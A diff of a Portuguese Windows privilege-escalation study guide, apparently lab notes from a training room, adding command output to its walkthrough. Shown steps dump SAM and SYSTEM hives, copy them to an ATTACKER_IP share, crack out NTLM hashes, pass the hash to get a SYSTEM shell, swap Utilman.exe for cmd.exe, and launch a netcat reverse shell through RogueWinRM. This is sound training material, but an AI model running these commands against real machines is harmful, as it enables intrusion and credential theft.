@@ -17,76 +17,6 @@
 
 ---
 
-# 🪟 Escalação de Privilégios no Windows
-## Técnicas Práticas de Elevação para NT AUTHORITY\SYSTEM
-
-> A escalação de privilégios em ambientes Windows é uma das fases mais críticas da pós-exploração.
->
-> Após obter acesso inicial com um usuário de baixo privilégio, o objetivo é identificar **configurações inseguras, permissões mal atribuídas, credenciais expostas ou serviços vulneráveis** que permitam elevar o contexto de execução para **Administrador** ou **NT AUTHORITY\SYSTEM**.
->
-> Diferente de ataques puramente baseados em exploits de kernel, a maioria das escaladas reais ocorre devido a **más práticas administrativas**, falhas de configuração e negligência operacional.
-
----
-
-## 🎯 Objetivos do Documento
-
-Este guia apresenta uma abordagem estruturada e prática para:
-
-- Identificar credenciais expostas em arquivos e históricos
-- Enumerar serviços e tarefas mal configuradas
-- Explorar permissões inseguras em arquivos e Service ACLs
-- Abusar de políticas como `AlwaysInstallElevated`
-- Explorar privilégios como `SeBackupPrivilege`, `SeImpersonate`, `SeTakeOwnership`
-- Executar técnicas de Pass-the-Hash
-- Consolidar metodologia de pós-exploração em Windows
-
----
-
-## 📌 Escopo Técnico
-
-- **Plataforma:** Microsoft Windows
-- **Contexto:** Pós-exploração / Red Team / Pentest Interno
-- **Nível Inicial:** Usuário não privilegiado
-- **Objetivo Final:** NT AUTHORITY\SYSTEM
-- **Vetores Abordados:**
-  - Credenciais expostas
-  - Serviços vulneráveis
-  - Tarefas agendadas
-  - Privilégios abusáveis
-  - Software de terceiros vulnerável
-
----
-
-## 🧠 Conceitos Fundamentais Envolvidos
-
-- Token Privileges e Security Context
-- Service Control Manager (SCM)
-- ACLs (Access Control Lists)
-- SID e Grupos Locais
-- UAC e Integrity Levels
-- Pass-the-Hash
-- Impersonation Attacks
-- Post-Exploitation Tradecraft
-
----
-
-## 🏷️ Tags
-
-`#WindowsPrivesc` `#PrivilegeEscalation`  
-`#PostExploitation` `#RedTeam`  
-`#SeImpersonate` `#ServiceAbuse`  
-`#AlwaysInstallElevated` `#PassTheHash`  
-`#CyberSecurity`
-
----
-
-## ⚠️ Aviso Legal
-
-> Este material é destinado exclusivamente para fins educacionais, laboratórios controlados e ambientes com autorização formal.
->
-> A exploração de sistemas sem permissão é ilegal e pode resultar em consequências criminais.
-
----
 # Escalação de Privilégios no Windows
 
 ## Introdução
@@ -576,6 +506,17 @@ C:\> net start THMService
 
 ```shell-session
 C:\> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========
+SeBackupPrivilege             Back up files and directories  Disabled
+SeRestorePrivilege            Restore files and directories  Disabled
+SeShutdownPrivilege           Shut down the system           Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 ```
 
 ### 3.1. SeBackupPrivilege e SeRestorePrivilege
@@ -588,7 +529,10 @@ Estes privilégios permitem que um usuário ignore as permissões de arquivo par
 
 ```shell-session
 C:\> reg save hklm\system C:\Users\THMBackup\system.hive
+The operation completed successfully.
+
 C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
+The operation completed successfully.
 ```
 
 **Explicação:** `reg save` exporta a chave de registro especificada (system e sam) para um arquivo. Graças ao `SeBackupPrivilege`, o comando funciona mesmo sem permissões de leitura direta nesses arquivos.
@@ -611,6 +555,12 @@ C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
 
 ```bash
 python3 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+
+[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 ```
 
 A saída mostrará o hash NTLM do administrador.
@@ -618,7 +568,22 @@ A saída mostrará o hash NTLM do administrador.
 - **Passo 5: Fazer login com o hash (Pass-the-Hash).** Use o `psexec.py` (ou `wmiexec.py`) para obter uma shell como SYSTEM.
 
 ```bash
-python3 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@MACHINE_IP
+python3 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.65.148.102
+
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.175.90.....
+[*] Found writable share ADMIN$
+[*] Uploading file nfhtabqO.exe
+[*] Opening SVCManager on 10.10.175.90.....
+[*] Creating service RoLE on 10.10.175.90.....
+[*] Starting service RoLE.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
 ```
 
 ### 3.2. SeTakeOwnershipPrivilege
@@ -627,6 +592,19 @@ Este privilégio permite que um usuário tome posse de qualquer objeto do sistem
 
 - **Passo 1: Confirmar o privilégio.** `whoami /priv` deve mostrar `SeTakeOwnershipPrivilege`.
 
+```shell-session
+C:\> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                              State
+============================= ======================================== ========
+SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
+```
+
 - **Passo 2: Escolher um alvo.** Um alvo clássico é o `Utilman.exe` (utilitário de acessibilidade), que pode ser acionado na tela de login.
 
 ![Utilman.exe](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a5437a609e41d982b320967667e9b97a.png)
@@ -634,6 +612,8 @@ Este privilégio permite que um usuário tome posse de qualquer objeto do sistem
 
 ```shell-session
 C:\> takeown /f C:\Windows\System32\Utilman.exe
+
+SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership".
 ```
 
 **Explicação:** `takeown` permite que o usuário se torne o proprietário do arquivo, graças ao privilégio.
@@ -642,15 +622,23 @@ C:\> takeown /f C:\Windows\System32\Utilman.exe
 
 ```shell-session
 C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
+
+processed file: Utilman.exe
+Successfully processed 1 files; Failed processing 0 files
 ```
 
 - **Passo 4: Substituir o arquivo alvo pelo `cmd.exe`.**
 
 ```shell-session
 C:\Windows\System32\> copy cmd.exe utilman.exe
+        1 file(s) copied.
 ```
 
 - **Passo 5: Acionar o payload.** Bloqueie a sessão do Windows (Win+L) ou vá para a tela de login. Clique no ícone de "Facilidade de Acesso" (ou pressione Win+U). Como o arquivo `utilman.exe` foi substituído pelo `cmd.exe`, um prompt de comando com privilégios de **SYSTEM** será aberto.
+
+![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/dd7290ca93369cee33182023cb9190ff.png)
+
+![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1401bc3dcb1e4eb84f526b95567a5ef8.png)
 
 ### 3.3. SeImpersonate / SeAssignPrimaryToken
 
@@ -661,6 +649,8 @@ Estes privilégios permitem que um processo "se passe" por outro usuário. São 
 ![SeAssignPrimaryToken](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/89e74e14454edc10fa2bd541ac359772.png)
 
 - **Passo 1: Confirmar os privilégios.** `whoami /priv` deve mostrar `SeImpersonatePrivilege` ou `SeAssignPrimaryTokenPrivilege`.
+
+![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/4603506a36f4bbda602dc67cdc845d9f.png)
 
 - **Passo 2: Usar uma ferramenta de exploração.** Vamos usar o `RogueWinRM`. Baixe-o na máquina alvo.
 
@@ -683,6 +673,17 @@ c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKE
 - `-a "-e cmd.exe ATTACKER_IP 4442"`: Os argumentos para o programa (no caso, um shell reverso).
 
 - **Resultado:** A ferramenta abusará do privilégio para forçar o serviço WinRM a executar nosso netcat como SYSTEM, nos dando uma conexão de volta com altos privilégios.
+	
+```bash
+nc -lvp 4442
+Listening on 0.0.0.0 4442
+Connection received on 10.10.175.90 49755
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv>whoami
+nt authority\system
+```
 
 ---
 ## 4. Abusando de Software Vulnerável
@@ -735,8 +736,17 @@ $s.Send($command)
 ```powershell
 PS C:\> net user pwnd
 User name                    pwnd
+Full Name
+Account active               Yes
+[...]
+
 Local Group Memberships      *Administrators       *Users
+Global Group memberships     *None
 ```
+
+Como último passo, é possível executar um prompt de comando como administrador:
+
+![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/bbd0af143c9a9b31c1acce32fabfdc0f.png)
 
 ---
 ## Ferramentas de Automação e Auxílio
